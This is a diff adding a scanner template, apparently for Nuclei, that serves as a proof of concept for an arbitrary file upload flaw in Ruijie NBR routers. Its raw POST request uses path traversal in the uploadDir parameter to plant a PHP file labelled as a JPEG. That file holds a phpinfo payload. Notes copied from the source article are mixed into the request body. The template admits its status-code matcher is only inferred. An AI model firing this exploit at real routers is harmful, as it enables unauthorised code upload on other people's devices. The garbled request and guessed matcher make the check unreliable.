@@ -1,0 +1,50 @@
+id: poc-uwk2r7psrlyof4d9
+info:
+  name: 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uwk2r7psrlyof4d9
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uwk2r7psrlyof4d9
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
+
+
+    Accept: text/plain, */*; q=0.01
+
+
+    Content-Disposition: form-data; name="file"; filename="111.php"
+
+
+    Content-Type: image/jpeg
+
+
+
+
+    <?php phpinfo();?>
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
